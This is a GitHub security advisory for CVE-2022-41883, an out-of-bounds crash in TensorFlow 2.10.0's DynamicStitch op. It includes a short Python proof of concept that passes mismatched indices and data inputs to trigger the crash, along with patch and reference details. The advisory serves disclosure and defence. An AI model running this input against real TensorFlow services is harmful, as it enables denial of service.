# [M] Out of bounds segmentation fault due to unequal op inputs in Tensorflow

## Summary
Severity: Medium
Advisory: GHSA-w58w-79xv-6vcj
CVE: CVE-2022-41883
CWE: CWE-125
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:H (CVSS_V3)
Published: 2022-11-21
Source: https://github.com/advisories/GHSA-w58w-79xv-6vcj
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=2.10.0 <2.10.1
- PyPI: `tensorflow-cpu` — affected >=2.10.0 <2.10.1
- PyPI: `tensorflow-gpu` — affected >=2.10.0 <2.10.1

## Details
### Impact
 [`tf.raw_ops.DynamicStitch`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/dynamic_stitch_op.cc) specifies input sizes when it is [registered](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ops/data_flow_ops.cc). 
```cpp
REGISTER_OP("DynamicStitch")
    .Input("indices: N * int32")
    .Input("data: N * T")
    .Output("merged: T")
    .Attr("N : int >= 1")
    .Attr("T : type")
    .SetShapeFn(DynamicStitchShapeFunction);
```
When it receives a differing number of inputs, such as when it is called with an `indices` size 1 and a `data` size 2, it will crash.
```python
import tensorflow as tf

# indices = 1*[tf.random.uniform([1,2], dtype=tf.dtypes.int32, maxval=100)]
indices = [tf.constant([[0, 1]]),]

# data = 2*[tf.random.uniform([1,2], dtype=tf.dtypes.float32, maxval=100)]
data = [tf.constant([[5, 6]]), tf.constant([[7, 8]])]

tf.raw_ops.DynamicStitch(
    indices=indices, 
    data=data)
```

### Patches
We have patched the issue in GitHub commit [f5381e0e10b5a61344109c1b7c174c68110f7629](https://github.com/tensorflow/tensorflow/commit/f5381e0e10b5a61344109c1b7c174c68110f7629).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1 as this is also affected.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Zizhuang Deng of IIE, UCAS

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-w58w-79xv-6vcj
- https://nvd.nist.gov/vuln/detail/CVE-2022-41883
- https://github.com/tensorflow/tensorflow/commit/f5381e0e10b5a61344109c1b7c174c68110f7629
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/dynamic_stitch_op.cc
- https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ops/data_flow_ops.cc
